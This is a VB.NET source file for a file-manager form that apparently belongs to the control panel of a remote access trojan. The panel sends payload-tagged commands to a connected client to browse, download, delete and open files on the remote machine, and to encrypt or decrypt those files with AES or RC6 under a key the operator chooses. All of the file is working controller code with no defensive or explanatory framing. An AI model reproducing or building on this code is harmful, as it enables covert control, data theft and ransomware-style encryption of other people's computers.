
Public Class FileManager_Form
    Private Sub FM_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '  Dim o As String = PL_FM & "|SP1|" & "" & "|SP2|" & "|YES|" & "|ENDING|"

        Task.Run(Sub() Launch())


    End Sub
    Public Async Sub Launch()
        Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & Label1.Text & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

    End Sub

    Private Async Sub GoForwardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GoForwardToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then


            If ListView1.SelectedItems(0).Tag = "FOLDER" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text & "\"

                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & newP & "|ENDING|"


                Label1.Text = newP

                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub

    Private Async Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click

        If Label1.Text.Length > 3 Then

            Dim Splitter As String() = Split(Label1.Text, "\")

            Dim newP As String
            For i = 0 To Splitter.Length - 3
                newP += Splitter(i) & "\"
            Next

            Label1.Text = newP
            Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & newP & "|ENDING|"
            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
        End If

    End Sub

    Private Async Sub DownloadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|DW|" & "|SP2|" & newP & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Async Sub DeleteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFileToolStripMenuItem.Click
        '"|DELFILE|"
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|DELFILE|" & "|SP2|" & newP & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub

    Private Async Sub OpenFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|OPENFILE|" & "|SP2|" & newP & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub

    Private Async Sub ListView1_DoubleClick(sender As Object, e As EventArgs) Handles ListView1.DoubleClick
        If ListView1.SelectedItems.Count = 1 Then


            If ListView1.SelectedItems(0).Tag = "FOLDER" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text & "\"

                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & newP & "|ENDING|"


                Label1.Text = newP

                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub






    Private Async Sub AESENCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AESENCToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_ECF1 & "|SP1|" & "" & "|SP2|" & "|AESENC|" & "|SP2|" & newP & "|SP2|" & TextBox1.Text & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub


    Private Async Sub AesDecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AesDecryptionToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_ECF1 & "|SP1|" & "" & "|SP2|" & "|AESDEC|" & "|SP2|" & newP & "|SP2|" & TextBox1.Text & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub




    Private Async Sub RC6EncryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RC6EncryptionToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_ECF1 & "|SP1|" & "" & "|SP2|" & "|RC6ENC|" & "|SP2|" & newP & "|SP2|" & TextBox1.Text & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub

    Private Async Sub RC6DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RC6DecryptionToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).Tag = "FILE" Then

                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text

                Dim o As String = Form1.PL_ECF1 & "|SP1|" & "" & "|SP2|" & "|RC6DEC|" & "|SP2|" & newP & "|SP2|" & TextBox1.Text & "|ENDING|"




                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
            End If
        End If
    End Sub
End Class